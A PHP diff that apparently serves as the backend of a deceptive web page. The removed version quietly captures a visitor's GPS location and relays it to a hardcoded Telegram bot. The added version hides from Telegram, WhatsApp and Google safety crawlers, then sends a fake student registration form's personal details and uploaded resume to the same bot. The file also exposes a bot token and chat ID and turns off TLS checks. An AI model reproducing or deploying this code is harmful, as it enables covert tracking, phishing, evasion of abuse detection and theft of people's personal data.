@@ -1,72 +1,122 @@
 <?php
-
-$botToken = "8386009786:AAE9SInLbXAHOI5HDwm9ctMhDicP7yYmUUM"; 
-$chatId = "-1003598938463";     
-
-// Receive Data
-$lat = $_POST['Lat'];
-$lon = $_POST['Lon'];
-$acc = $_POST['Acc'];
-$alt = $_POST['Alt'];
-$dir = $_POST['Dir'];
-$spd = $_POST['Spd'];
-
-// --- 1. GOOGLE MAPS LINK ---
-$googleMapsLink = "https://www.google.com/maps?q=" . $lat . "," . $lon;
-
-// --- 2. FORMAT DATA (Add Text Here) ---
-
-// Accuracy
-$acc_clean = round($acc, 1); 
-
-// Altitude Logic (Sea Level)
-if ($alt < 0) {
-    $alt_text = round(abs($alt), 0) . " m below sea level";
-} else {
-    $alt_text = round($alt, 0) . " m above sea level";
+// Anti-bot / crawler check (optional but recommended)
+$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
+if (preg_match('/(TelegramBot|WhatsApp|Instagram|facebookexternalhit|Facebot|GoogleImageProxy|Googlebot|Google-Safety|Mediapartners-Google)/i', $userAgent)) {
+    exit();
 }
 
-// Speed Logic (Stationary check)
-if ($spd == 0 || $spd == "") {
-    $spd_text = "0 m/s (Stationary)";
-} else {
-    $spd_text = round($spd, 1) . " m/s";
+// ---------- CONFIGURATION ----------
+$botToken = "8386009786:AAE9SInLbXAHOI5HDwm9ctMhDicP7yYmUUM";
+$chatId   = "-1003598938463";
+// -----------------------------------
+
+// Helper: send plain text message to Telegram
+function sendTelegramMessage($text) {
+    global $botToken, $chatId;
+    $url = "https://api.telegram.org/bot$botToken/sendMessage";
+    $data = [
+        'chat_id' => $chatId,
+        'text'    => $text,
+        'parse_mode' => 'HTML'
+    ];
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_POST, true);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    curl_exec($ch);
+    curl_close($ch);
 }
 
-// Direction Logic (Stationary check)
-if ($spd == 0 || $dir == "" || $dir == 0) {
-    $dir_text = "None (Stationary)";
-} else {
-    $dir_text = round($dir, 1) . "°";
+// Helper: send a document to Telegram
+function sendTelegramDocument($filePath, $caption = '') {
+    global $botToken, $chatId;
+    $url = "https://api.telegram.org/bot$botToken/sendDocument";
+    $postFields = [
+        'chat_id' => $chatId,
+        'document' => new CURLFile($filePath),
+        'caption'  => $caption,
+        'parse_mode' => 'HTML'
+    ];
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_POST, true);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    curl_exec($ch);
+    curl_close($ch);
 }
 
-// --- 3. CREATE THE MESSAGE ---
-$message = "<b>📍 LOCATION CAPTURED!</b>\n\n";
+// Collect form fields (sanitize for HTML)
+$email    = htmlspecialchars($_POST['email'] ?? '', ENT_QUOTES, 'UTF-8');
+$fullName = htmlspecialchars($_POST['fullname'] ?? '', ENT_QUOTES, 'UTF-8');
+$gender   = htmlspecialchars($_POST['gender'] ?? '', ENT_QUOTES, 'UTF-8');
+$college  = htmlspecialchars($_POST['college'] ?? '', ENT_QUOTES, 'UTF-8');
+$degree   = htmlspecialchars($_POST['degree'] ?? '', ENT_QUOTES, 'UTF-8');
+$stream   = htmlspecialchars($_POST['stream'] ?? '', ENT_QUOTES, 'UTF-8');
+$cgpa     = htmlspecialchars($_POST['cgpa'] ?? '', ENT_QUOTES, 'UTF-8');
 
-$message .= "<b>🌎 Latitude:</b> <code>" . $lat . "°</code>\n";
-$message .= "<b>🌎 Longitude:</b> <code>" . $lon . "°</code>\n";
-$message .= "<b>🎯 Accuracy:</b> <code>" . $acc_clean . " m</code>\n";
-$message .= "<b>🏔 Altitude:</b> " . $alt_text . "\n"; 
-$message .= "<b>🧭 Direction:</b> " . $dir_text . "\n";  // Uses PHP logic
-$message .= "<b>🚗 Speed:</b> " . $spd_text . "\n\n";   // Uses PHP logic
-$message .= "<b>🗺️ <a href='" . $googleMapsLink . "'>Open in Google Maps</a></b>";
+// Handle file upload
+$resume = $_FILES['resume'] ?? null;
 
-// Send to Telegram
-$website = "https://api.telegram.org/bot" . $botToken;
-$params = [
-    'chat_id' => $chatId,
-    'text' => $message,
-    'parse_mode' => 'HTML',
-    'disable_web_page_preview' => true
-];
+if (!$resume || $resume['error'] !== UPLOAD_ERR_OK) {
+    // No file uploaded – send only the text details
+    $text = "📋 <b>New Registration (no file)</b>\n\n"
+          . "Email: $email\n"
+          . "Full Name: $fullName\n"
+          . "Gender: $gender\n"
+          . "College: $college\n"
+          . "Degree: $degree\n"
+          . "Stream: $stream\n"
+          . "CGPA: $cgpa";
+    sendTelegramMessage($text);
+} else {
+    // Validate file type
+    $allowedMime = [
+        'application/pdf',
+        'application/msword',
+        'application/vnd.openxmlformats-officedocument.wordprocessingml.document'
+    ];
+    $finfo = finfo_open(FILEINFO_MIME_TYPE);
+    $mime = finfo_file($finfo, $resume['tmp_name']);
+    finfo_close($finfo);
 
-$ch = curl_init($website . '/sendMessage');
-curl_setopt($ch, CURLOPT_HEADER, false);
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-curl_setopt($ch, CURLOPT_POST, 1);
-curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
-curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-$result = curl_exec($ch);
-curl_close($ch);
- 
+    if (!in_array($mime, $allowedMime)) {
+        sendTelegramMessage("❌ Invalid file type uploaded by $email.");
+        exit;
+    }
+
+    // Check file size (max 10 MB)
+    if ($resume['size'] > 10 * 1024 * 1024) {
+        sendTelegramMessage("❌ File too large (over 10 MB) from $email.");
+        exit;
+    }
+
+    // Move file to a temporary location
+    $tmpDir = sys_get_temp_dir();
+    $tmpFilePath = $tmpDir . '/' . basename($resume['name']);
+    move_uploaded_file($resume['tmp_name'], $tmpFilePath);
+
+    // Prepare caption with form data
+    $caption = "📄 <b>New Registration with Resume</b>\n\n"
+             . "Email: $email\n"
+             . "Full Name: $fullName\n"
+             . "Gender: $gender\n"
+             . "College: $college\n"
+             . "Degree: $degree\n"
+             . "Stream: $stream\n"
+             . "CGPA: $cgpa\n"
+             . "File name: " . $resume['name'];
+
+    // Send the document with caption
+    sendTelegramDocument($tmpFilePath, $caption);
+
+    // Clean up temporary file
+    unlink($tmpFilePath);
+}
+
+// Return a simple response to the AJAX call
+echo "OK";
 ?>
